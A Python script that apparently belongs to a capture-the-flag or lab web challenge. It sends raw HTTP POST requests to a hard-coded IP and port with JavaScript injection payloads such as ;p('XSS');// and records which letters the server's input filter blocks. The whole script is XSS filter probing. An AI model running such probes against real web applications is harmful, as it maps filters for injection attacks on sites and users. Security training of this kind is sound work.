import socket
import time

# Simple raw TCP test - send and immediately try to read
print("Testing with minimal socket operations")
print("=" * 60)

host = "94.237.49.241"
port = 4200
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

blocked_chars = []
allowed_chars = []

try:
    print("First, testing single letter 'p' with brief timeout...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)  # Very short timeout for initial test
    
    # Quick connect
    sock.connect((host, port))
    print(f"✓ Connected to {host}:{port}")
    
    # Send minimal data
    test_data = "name=;p('XSS');//"
    http_request = f"POST /page HTTP/1.1\r\nHost: {host}:{port}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(test_data)}\r\n\r\n{test_data}"
    
    sock.send(http_request.encode('utf-8'))
    print(f"✓ Sent {len(http_request)} bytes")
    
    # Try to receive with very short timeout
    sock.settimeout(3)
    
    try:
        response = sock.recv(8192)
        if response:
            response_text = response.decode('utf-8', errors='ignore')
            print(f"✓ Received response ({len(response)} bytes):")
            print(response_text)
            
            # Check for blocked pattern
            if "Sorry you can't use:" in response_text:
                for line in response_text.split('\n'):
                    if "Sorry you can't use:" in line:
                        print(f"\nBLOCKED: {line.strip()}")
                        char = line.split("'")[1] if "'" in line else "unknown"
                        blocked_chars.append(char)
                        break
        else:
            print("✗ No data received (empty response)")
    except socket.timeout:
        print("✗ Timeout on recv (no data within 3s)")
    finally:
        sock.close()
        
except Exception as e:
    print(f"✗ Error: {str(e)}")

print("\n" + "=" * 60)
print("Testing with immediate close after sending...")
print("=" * 60)

for letter in letters_to_test[:3]:  # Test just first 3 letters
    print(f"\nTesting '{letter}'...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    
    try:
        sock.connect((host, port))
        
        test_data = f"name=;{letter}('XSS');//"
        http_request = f"POST /page HTTP/1.1\r\nHost: {host}:{port}\r\nContent-Length: {len(test_data)}\r\n\r\n{test_data}"
        
        sock.send(http_request.encode('utf-8'))
        sock.shutdown(socket.SHUT_WR)  # Half-close to signal we're done sending
        
        # Try to read any response
        response = b""
        sock.settimeout(10)
        
        while True:
            try:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                response += chunk
                print(f"  Received {len(chunk)} bytes...")
                if b'\r\n\r\n' in response:  # Got headers at least
                    break
            except socket.timeout:
                if response:
                    print(f"  Timeout but got {len(response)} bytes")
                break
        
        if response:
            response_text = response.decode('utf-8', errors='ignore')
            print(f"  Total received: {len(response)} bytes")
            
            # Find status line
            if '\r\n' in response_text:
                status_line = response_text.split('\r\n')[0]
                print(f"  Status: {status_line}")
            
            # Check for blocked message
            if f"Sorry you can't use: '{letter}'" in response_text:
                print(f"  ✗ BLOCKED: '{letter}' is filtered")
                blocked_chars.append(letter)
            elif "Sorry you can't use:" in response_text:
                print(f"  ✗ BLOCKED (some character filtered)")
            else:
                print(f"  ✓ ALLOWED: '{letter}' seems OK")
                allowed_chars.append(letter)
        else:
            print(f"  ? No response (timeout or server closed)")
            
    except Exception as e:
        print(f"  ✗ Error: {str(e)}")
    finally:
        sock.close()
    
    time.sleep(1)

print("\n" + "=" * 60)
print("Quick summary:")
print(f"Blocked: {blocked_chars}")
print(f"Allowed: {allowed_chars}")
